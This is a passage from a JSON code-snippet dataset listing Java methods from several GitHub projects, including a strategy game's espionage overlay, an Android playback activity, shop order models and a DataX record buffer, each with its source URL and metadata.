false;\n        parent.clearOverlay();\n        RotPUI.instance().selectStealTechPanel(mission, empId);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/overlay/MapOverlayEspionageMission.java", "stars": "74", "class_props": {"extends": "MapOverlay", "implements": null, "modifiers": ["public"]}}, {"id": 59712, "method_name": "init", "class_name": "MapOverlayEspionageMission", "params": ["EspionageMission", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init(EspionageMission esp, int id) {\n        labImg = null;\n        mission = esp;\n        empId = id;\n        techCategoryHoverButton = -1;\n        drawSprites = true;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/overlay/MapOverlayEspionageMission.java", "stars": "74", "class_props": {"extends": "MapOverlay", "implements": null, "modifiers": ["public"]}}, {"id": 59713, "method_name": "drawSprites", "class_name": "MapOverlayEspionageMission", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean drawSprites()   { return drawSprites; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/overlay/MapOverlayEspionageMission.java", "stars": "74", "class_props": {"extends": "MapOverlay", "implements": null, "modifiers": ["public"]}}, {"id": 59714, "method_name": "masksMouseOver", "class_name": "MapOverlayEspionageMission", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean masksMouseOver(int x, int y)   { return true; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/overlay/MapOverlayEspionageMission.java", "stars": "74", "class_props": {"extends": "MapOverlay", "implements": null, "modifiers": ["public"]}}, {"id": 59715, "method_name": "hoveringOverSprite", "class_name": "MapOverlayEspionageMission", "params": ["Sprite"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hoveringOverSprite(Sprite o) {\n        int prevHover = techCategoryHoverButton;\n        techCategoryHoverButton = -1;\n        if (o instanceof TechCategorySprite)\n            techCategoryHoverButton = ((TechCategorySprite) o).categoryNum();\n        if (prevHover != techCategoryHoverButton) {\n            Graphics2D g = (Graphics2D) parent.map().getGraphics();\n            if (prevHover >= 0)\n                paintTechCategoryButton(g, categorySprites[prevHover]);\n            if (techCategoryHoverButton >= 0)\n                paintTechCategoryButton(g, categorySprites[techCategoryHoverButton]);\n        }\n        return true;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/overlay/MapOverlayEspionageMission.java", "stars": "74", "class_props": {"extends": "MapOverlay", "implements": null, "modifiers": ["public"]}}, {"id": 59716, "method_name": "handleKeyPress", "class_name": "MapOverlayEspionageMission", "params": ["KeyEvent"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean handleKeyPress(KeyEvent e) {\n        switch(e.getKeyCode()) {\n            case KeyEvent.VK_1:\n                if (this.canSelect(0))  \n                    categorySprites[0].click(parent.map(), 1, false, true);\n                break;\n            case KeyEvent.VK_2:\n                if (this.canSelect(1))\n                    categorySprites[1].click(parent.map(), 1, false, true);\n                break;\n            case KeyEvent.VK_3:\n                if (this.canSelect(2))\n                    categorySprites[2].click(parent.map(), 1, false, true);\n                break;\n            case KeyEvent.VK_4:\n                if (this.canSelect(3))\n                    categorySprites[3].click(parent.map(), 1, false, true);\n                break;\n            case KeyEvent.VK_5:\n                if (this.canSelect(4))\n                    categorySprites[4].click(parent.map(), 1, false, true);\n                break;\n            case KeyEvent.VK_6:\n                if (this.canSelect(5))\n                    categorySprites[5].click(parent.map(), 1, false, true);\n                break;\n            default:\n                misClick(); break;\n        }\n        return true;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/overlay/MapOverlayEspionageMission.java", "stars": "74", "class_props": {"extends": "MapOverlay", "implements": null, "modifiers": ["public"]}}, {"id": 59717, "method_name": "paintOverMap", "class_name": "MapOverlayEspionageMission", "params": ["MainUI", "GalaxyMapPanel", "Graphics2D"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void paintOverMap(MainUI parent, GalaxyMapPanel ui, Graphics2D g) {\n        if (!drawSprites)\n            return;\n        \n        int w = ui.getWidth()-scaled(150);\n        int h = ui.getHeight()-BasePanel.s50;\n        Galaxy gal = galaxy();\n        Empire emp = gal.empire(empId);\n        \n        for (TechCategorySprite spr: categorySprites) {\n            spr.espionage(mission);\n            parent.addNextTurnControl(spr);\n        }\n        int s7 = BasePanel.s7;\n        int s20 = BasePanel.s20;\n        int s45 = BasePanel.s45;\n        int s50 = BasePanel.s50;\n        int s60 = BasePanel.s60;\n\n        // draw map mask\n        if (mask == null) {\n            int r = s60;\n            int centerX = w*2/5;\n            int centerY = h*2/5;\n            Ellipse2D window = new Ellipse2D.Float();\n            window.setFrame(centerX-r, centerY-r, r+r, r+r);\n            Area st1 = new Area(window);\n            Rectangle blackout  = new Rectangle();\n            blackout.setFrame(0,0,w,h);\n            mask = new Area(blackout);\n            mask.subtract(st1);\n        }\n\n        int x0 = scaled(335);\n        int y0 = scaled(235);\n        int w0 = scaled(555);\n        int h0 = scaled(235);\n        g.setColor(MainUI.paneShadeC2);\n        g.fillRect(x0, y0, w0, h0);\n\n        int x1 = x0 + s7;\n        int y1 = y0 + s7;\n        int w1 = w0 - s7 - s7;\n        int h1 = h0 - s7 - s7;\n        g.setColor(MainUI.paneBackground);\n        g.fillRect(x1, y1, w1, h1);\n\n        // draw year/turn info\n        String yearStr = displayYearOrTurn();\n        g.setFont(narrowFont(40));\n        int sw = g.getFontMetrics().stringWidth(yearStr);\n        int leftW = scaled(250);\n        int rightW = w1-leftW;\n        int x1a = x1+((leftW-sw)/2);\n        drawBorderedString(g, yearStr, 2, x1a, y1+s45, SystemPanel.textShadowC, SystemPanel.orangeText);\n\n        // draw title\n        String title = text(\"NOTICE_ESPIONAGE_TITLE\", emp.raceName());\n        g.setFont(narrowFont(15));\n        int x1b = x1+leftW;\n        g.setColor(SystemPanel.blackText);\n        g.drawString(title, x1b, y1+s20);\n\n        // draw subtitle\n        String subtitle = text(\"NOTICE_ESPIONAGE_SUBTITLE\");\n        g.setFont(narrowFont(22));\n        drawShadowedString(g, subtitle, 3, x1b, y1+s50, SystemPanel.textShadowC, Color.white);\n\n        // draw footer\n        String footer = text(\"NOTICE_ESPIONAGE_FOOTER\");\n        g.setFont(narrowFont(15));\n        int sw2 = g.getFontMetrics().stringWidth(footer);\n        int x1c = x1+leftW+((rightW-sw2)/2);\n        g.setColor(SystemPanel.blackText);\n        g.drawString(footer, x1c, y1+h1-BasePanel.s10);\n\n        int xOff = scaled(player().race().espionageX);\n        int yOff = scaled(player().race().espionageY);\n        if (labImg == null) {\n            labImg = asBufferedImage(emp.race().laboratory());\n            Graphics imgG = labImg.getGraphics();\n            BufferedImage spyImg = player().race().spyQuiet();\n            imgG.drawImage(spyImg, 0, 0, labImg.getWidth(), labImg.getHeight(), xOff, yOff, (spyImg.getWidth()/2)+xOff, (spyImg.getHeight()/2)+yOff, null);\n            imgG.dispose();\n        }\n\n        int imgW = leftW;\n        int imgH = imgW*Rotp.IMG_H/Rotp.IMG_W;\n        g.drawImage(labImg, x1, y1+h1-imgH, x1+leftW, y1+h1, 0, 0, labImg.getWidth(), labImg.getHeight(), null);\n\n        // draw all 6 category boxes\n\n        int catW = scaled(130);\n        int catH = BasePanel.s35;\n        int catX1 = x1+scaled(260);\n        int catX2 = x1+scaled(395);\n        int catY1 = y1+BasePanel.s70;\n        int catY2 = y1+scaled(112);\n        int catY3 = y1+scaled(154);\n\n        if (grayBack1 == null) {\n            float[] dist = {0.0f, 0.5f, 1.0f};\n            Point2D start = new Point2D.Float(catX1, 0);\n            Point2D end = new Point2D.Float(catX1+catW, 0);\n            Color[] grays = { grayEdgeC, grayMidC, grayEdgeC };\n            Color[] greens = { greenEdgeC, greenMidC, greenEdgeC };\n            grayBack1 = new LinearGradientPaint(start, end, dist, grays);\n            greenBack1 = new LinearGradientPaint(start, end, dist, greens);\n            start = new Point2D.Float(catX2, 0);\n            end = new Point2D.Float(catX2+catW, 0);\n            grayBack2 = new LinearGradientPaint(start, end, dist, grays);\n            greenBack2 = new LinearGradientPaint(start, end, dist, greens);\n        }\n        paintTechCategoryButton(g, 0, catX1, catY1, catW, catH);\n        paintTechCategoryButton(g, 1, catX2, catY1, catW, catH);\n\n        paintTechCategoryButton(g, 2, catX1, catY2, catW, catH);\n        paintTechCategoryButton(g, 3, catX2, catY2, catW, catH);\n\n        paintTechCategoryButton(g, 4, catX1, catY3, catW, catH);\n        paintTechCategoryButton(g, 5, catX2, catY3, catW, catH);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/overlay/MapOverlayEspionageMission.java", "stars": "74", "class_props": {"extends": "MapOverlay", "implements": null, "modifiers": ["public"]}}, {"id": 59718, "method_name": "advanceMap", "class_name": "MapOverlayEspionageMission", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void advanceMap() {\n        parent.resumeTurn();\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/overlay/MapOverlayEspionageMission.java", "stars": "74", "class_props": {"extends": "MapOverlay", "implements": null, "modifiers": ["public"]}}, {"id": 59719, "method_name": "paintTechCategoryButton", "class_name": "MapOverlayEspionageMission", "params": ["Graphics2D", "TechCategorySprite"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void paintTechCategoryButton(Graphics2D g, TechCategorySprite spr) {\n        paintTechCategoryButton(g, spr.categoryNum(), spr.box().x, spr.box().y, spr.box().width, spr.box().height);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/overlay/MapOverlayEspionageMission.java", "stars": "74", "class_props": {"extends": "MapOverlay", "implements": null, "modifiers": ["public"]}}, {"id": 59720, "method_name": "paintTechCategoryButton", "class_name": "MapOverlayEspionageMission", "params": ["Graphics2D", "int", "int", "int", "int", "int"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void paintTechCategoryButton(Graphics2D g, int catNum, int x, int y, int w, int h) {\n        // determine which green/gray gradients to use\n        LinearGradientPaint grayBack, greenBack;\n        if (catNum % 2 == 0) {\n            grayBack = grayBack1;\n            greenBack = greenBack1;\n        }\n        else {\n            grayBack = grayBack2;\n            greenBack = greenBack2;\n        }\n\n        // draw shadow around button\n        int bdr = BasePanel.s3;\n        g.setPaint(MainUI.darkShadowC);\n        g.fillRect(x+bdr, y+bdr, w, h);\n\n        // draw button background gradieant\n        if (techCategoryHoverButton == catNum)\n            g.setPaint(greenBack);\n        else\n            g.setPaint(grayBack);\n        g.fillRect(x, y, w, h);\n\n        // draw button border\n        Stroke prev = g.getStroke();\n        g.setStroke(BasePanel.stroke2);\n        g.setColor(SystemPanel.whiteText);\n        g.drawRect(x, y, w, h);\n        g.setStroke(prev);\n\n        // draw button text\n        g.setFont(narrowFont(20));\n        String s = text(TechCategory.id(catNum));\n        if (canSelect(catNum))\n            s = concat(str(catNum+1), \" - \", s);\n        int sw = g.getFontMetrics().stringWidth(s);\n        int xc = x+(w-sw)/2;\n        Color c0 = mission.inCategory(TechCategory.id(catNum)) == null ? SystemPanel.grayText : Color.white;\n        drawShadowedString(g, s, 3, xc, y+h-BasePanel.s12, MainUI.darkShadowC, c0);\n\n        // set mouse bounds for button\n        categorySprites[catNum].setBounds(x, y, w, h);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/overlay/MapOverlayEspionageMission.java", "stars": "74", "class_props": {"extends": "MapOverlay", "implements": null, "modifiers": ["public"]}}, {"id": 59721, "method_name": "onCreate", "class_name": "PlaybackActivity", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_playback);\n        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);\n        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,WindowManager.LayoutParams.FLAG_FULLSCREEN);\n        Fragment fragment = getSupportFragmentManager().findFragmentByTag(getString(R.string.playback_tag));\n        if (fragment instanceof PlaybackFragment) {\n            mPlaybackFragment = (PlaybackFragment) fragment;\n        }\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/ui/PlaybackActivity.java", "stars": "9", "class_props": {"extends": "LeanbackActivity", "implements": null, "modifiers": ["public"]}}, {"id": 59722, "method_name": "onStop", "class_name": "PlaybackActivity", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onStop() {\n        super.onStop();\n        finish();\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/ui/PlaybackActivity.java", "stars": "9", "class_props": {"extends": "LeanbackActivity", "implements": null, "modifiers": ["public"]}}, {"id": 59723, "method_name": "onKeyDown", "class_name": "PlaybackActivity", "params": ["int", "KeyEvent"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onKeyDown(int keyCode, KeyEvent event) {\n        if (keyCode == KeyEvent.KEYCODE_BUTTON_R1) {\n            mPlaybackFragment.skipToNext();\n            return true;\n        } else if (keyCode == KeyEvent.KEYCODE_BUTTON_L1) {\n            mPlaybackFragment.skipToPrevious();\n            return true;\n        } else if (keyCode == KeyEvent.KEYCODE_BUTTON_L2) {\n            mPlaybackFragment.rewind();\n        } else if (keyCode == KeyEvent.KEYCODE_BUTTON_R2) {\n            mPlaybackFragment.fastForward();\n        }\n        return super.onKeyDown(keyCode, event);\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/ui/PlaybackActivity.java", "stars": "9", "class_props": {"extends": "LeanbackActivity", "implements": null, "modifiers": ["public"]}}, {"id": 59724, "method_name": "onGenericMotionEvent", "class_name": "PlaybackActivity", "params": ["MotionEvent"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onGenericMotionEvent(MotionEvent event) {\n        // This method will handle gamepad events.\n        if (event.getAxisValue(MotionEvent.AXIS_LTRIGGER) > GAMEPAD_TRIGGER_INTENSITY_ON\n                && !gamepadTriggerPressed) {\n            mPlaybackFragment.rewind();\n            gamepadTriggerPressed = true;\n        } else if (event.getAxisValue(MotionEvent.AXIS_RTRIGGER) > GAMEPAD_TRIGGER_INTENSITY_ON\n                && !gamepadTriggerPressed) {\n            mPlaybackFragment.fastForward();\n            gamepadTriggerPressed = true;\n        } else if (event.getAxisValue(MotionEvent.AXIS_LTRIGGER) < GAMEPAD_TRIGGER_INTENSITY_OFF\n                && event.getAxisValue(MotionEvent.AXIS_RTRIGGER) < GAMEPAD_TRIGGER_INTENSITY_OFF) {\n            gamepadTriggerPressed = false;\n        }\n        return super.onGenericMotionEvent(event);\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/ui/PlaybackActivity.java", "stars": "9", "class_props": {"extends": "LeanbackActivity", "implements": null, "modifiers": ["public"]}}, {"id": 59725, "method_name": "readOperands", "class_name": "Observation", "params": ["StringParser"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void readOperands(StringParser parser);\n\n    public abstract void writeOperands(StringBuilder output, boolean verbose);\n\n}\n\n", "url": "https://raw.githubusercontent.com/mjtb49/LattiCG/master/src/randomreverser/reversal/observation/Observation.java", "stars": "14", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 59726, "method_name": "writeOperands", "class_name": "Observation", "params": ["StringBuilder", "boolean"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void writeOperands(StringBuilder output, boolean verbose);\n\n}\n\n", "url": "https://raw.githubusercontent.com/mjtb49/LattiCG/master/src/randomreverser/reversal/observation/Observation.java", "stars": "14", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 59727, "method_name": "getOrderDetails", "class_name": "OrderItemEndPoint", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Order", "snippet": "    public Order getOrderDetails() {\n        return orderDetails;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelEndPoints/OrderItemEndPoint.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59728, "method_name": "setOrderDetails", "class_name": "OrderItemEndPoint", "params": ["Order"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOrderDetails(Order orderDetails) {\n        this.orderDetails = orderDetails;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelEndPoints/OrderItemEndPoint.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59729, "method_name": "getShopDetails", "class_name": "OrderItemEndPoint", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Shop", "snippet": "    public Shop getShopDetails() {\n        return shopDetails;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelEndPoints/OrderItemEndPoint.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59730, "method_name": "setShopDetails", "class_name": "OrderItemEndPoint", "params": ["Shop"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setShopDetails(Shop shopDetails) {\n        this.shopDetails = shopDetails;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelEndPoints/OrderItemEndPoint.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59731, "method_name": "getItemCount", "class_name": "OrderItemEndPoint", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getItemCount() {\n        return itemCount;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelEndPoints/OrderItemEndPoint.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59732, "method_name": "setItemCount", "class_name": "OrderItemEndPoint", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setItemCount(Integer itemCount) {\n        this.itemCount = itemCount;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelEndPoints/OrderItemEndPoint.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59733, "method_name": "getOffset", "class_name": "OrderItemEndPoint", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getOffset() {\n        return offset;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelEndPoints/OrderItemEndPoint.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59734, "method_name": "setOffset", "class_name": "OrderItemEndPoint", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOffset(Integer offset) {\n        this.offset = offset;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelEndPoints/OrderItemEndPoint.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59735, "method_name": "getLimit", "class_name": "OrderItemEndPoint", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getLimit() {\n        return limit;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelEndPoints/OrderItemEndPoint.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59736, "method_name": "setLimit", "class_name": "OrderItemEndPoint", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLimit(Integer limit) {\n        this.limit = limit;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelEndPoints/OrderItemEndPoint.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59737, "method_name": "getResults", "class_name": "OrderItemEndPoint", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<OrderItem>", "snippet": "    public List<OrderItem> getResults() {\n        return results;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelEndPoints/OrderItemEndPoint.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59738, "method_name": "setResults", "class_name": "OrderItemEndPoint", "params": ["List<OrderItem>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setResults(List<OrderItem> results) {\n        this.results = results;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelEndPoints/OrderItemEndPoint.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59739, "method_name": "getMax_limit", "class_name": "OrderItemEndPoint", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getMax_limit() {\n        return max_limit;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelEndPoints/OrderItemEndPoint.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59740, "method_name": "setMax_limit", "class_name": "OrderItemEndPoint", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMax_limit(Integer max_limit) {\n        this.max_limit = max_limit;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelEndPoints/OrderItemEndPoint.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59741, "method_name": "getArg0", "class_name": "UpdateUserCardCopy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "UserCardCopy", "snippet": "    public UserCardCopy getArg0() {\n        return arg0;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/copy/UpdateUserCardCopy.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59742, "method_name": "setArg0", "class_name": "UpdateUserCardCopy", "params": ["UserCardCopy"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setArg0(UserCardCopy value) {\n        this.arg0 = value;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/copy/UpdateUserCardCopy.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59743, "method_name": "createRecord", "class_name": "BufferedRecordExchanger", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Record", "snippet": "    public Record createRecord() {\n        try {\n            return BufferedRecordExchanger.RECORD_CLASS.newInstance();\n        } catch (Exception e) {\n            throw DataXException.asDataXException(\n                    FrameworkErrorCode.CONFIG_ERROR, e);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/exchanger/BufferedRecordExchanger.java", "stars": "23", "class_props": {"extends": null, "implements": ["RecordSender", "RecordReceiver"], "modifiers": ["public"]}}, {"id": 59744, "method_name": "sendToWriter", "class_name": "BufferedRecordExchanger", "params": ["Record"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendToWriter(Record record) {\n        if (shutdown) {\n            throw DataXException.asDataXException(CommonErrorCode.SHUT_DOWN_TASK, \"\");\n        }\n\n        Validate.notNull(record, \"record\u4e0d\u80fd\u4e3a\u7a7a.\");\n\n        if (record.getMemorySize() > this.byteCapacity) {\n            this.pluginCollector.collectDirtyRecord(record, new Exception(String.format(\"\u5355\u6761\u8bb0\u5f55\u8d85\u8fc7\u5927\u5c0f\u9650\u5236\uff0c\u5f53\u524d\u9650\u5236\u4e3a:%s\", this.byteCapacity)));\n            return;\n        }\n\n        boolean isFull = (this.bufferIndex >= this.bufferSize || this.memoryBytes.get() + record.getMemorySize() > this.byteCapacity);\n        if (isFull) {\n            flush();\n        }\n\n        this.buffer.add(record);\n        this.bufferIndex++;\n        memoryBytes.addAndGet(record.getMemorySize());\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/exchanger/BufferedRecordExchanger.java", "stars": "23", "class_props": {"extends": null, "implements": ["RecordSender", "RecordReceiver"], "modifiers": ["public"]}}, {"id": 59745, "method_name": "flush", "class_name": "BufferedRecordExchanger", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void flush() {\n        if (shutdown) {\n            throw DataXException.asDataXException(CommonErrorCode.SHUT_DOWN_TASK, \"\");\n        }\n        this.recordChannel.pushAll(this.buffer);\n        this.buffer.clear();\n        this.bufferIndex = 0;\n        this.memoryBytes.set(0);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/exchanger/BufferedRecordExchanger.java", "stars": "23", "class_props": {"extends": null, "implements": ["RecordSender", "RecordReceiver"], "modifiers": ["public"]}}, {"id": 59746, "method_name": "terminate", "class_name": "BufferedRecordExchanger", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void terminate() {\n        if (shutdown) {\n            throw DataXException.asDataXException(CommonErrorCode.SHUT_DOWN_TASK, \"\");\n        }\n        flush();\n        this.recordChannel.pushTerminate(TerminateRecord.get());\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/exchanger/BufferedRecordExchanger.java", "stars": "23", "class_props": {"extends": null, "implements": ["RecordSender", "RecordReceiver"], "modifiers": ["public"]}}, {"id": 59747, "method_name": "getFromReader", "class_name": "BufferedRecordExchanger", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Record", "snippet": "    public Record getFromReader() {\n        if (shutdown) {\n            throw DataXException.asDataXException(CommonErrorCode.SHUT_DOWN_TASK, \"\");\n        }\n        boolean isEmpty = (this.bufferIndex >= this.buffer.size());\n        if (isEmpty) {\n            receive();\n        }\n\n        Record record = this.buffer.get(this.bufferIndex++);\n        if (record instanceof TerminateRecord) {\n            record = null;\n        }\n        return record;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/exchanger/BufferedRecordExchanger.java", "stars": "23", "class_props": {"extends": null, "implements": ["RecordSender", "RecordReceiver"], "modifiers": ["public"]}}, {"id": 59748, "method_name": "shutdown", "class_name": "BufferedRecordExchanger", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void shutdown() {\n        shutdown = true;\n        buffer.clear();\n        recordChannel.clear();\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/exchanger/BufferedRecordExchanger.java", "stars": "23", "class_props": {"extends": null, "implements": ["RecordSender", "RecordReceiver"], "modifiers": ["public"]}}, {"id": 59749, "method_name": "receive", "class_name": "BufferedRecordExchanger", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void receive() {\n        this.recordChannel.pullAll(this.buffer);\n        this.bufferIndex = 0;\n        this.bufferSize = this.buffer.size();\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/exchanger/BufferedRecordExchanger.java", "stars": "23", "class_props": {"extends": null, "implements": ["RecordSender", "RecordReceiver"], "modifiers": ["public"]}}, {"id": 59750, "method_name": "onCreate", "class_name": "BaseGlobalVar", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreate(@Nullable Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n\n        dataStatsCountry = GlobalVar.getInstance().getDataStatsCountry();\n        dataStatsSummary = GlobalVar.getInstance().getDataStatsSummary();\n        dataStatsGlobal   = GlobalVar.getInstance().getDataStatsGlobal();\n        layoutStatisticHeight = GlobalVar.getInstance().getLayoutStatisticHeight();\n    }", "url": "https://raw.githubusercontent.com/fadhilahramadhan/Android_Covid19Stats/master/app/src/main/java/fadhilah/ramadhan/covid19stats/base/BaseGlobalVar.java", "stars": "2", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 59751, "method_name": "testHome", "class_name": "ShutdownSampleActuatorApplicationTests", "params": [], "throws": null, 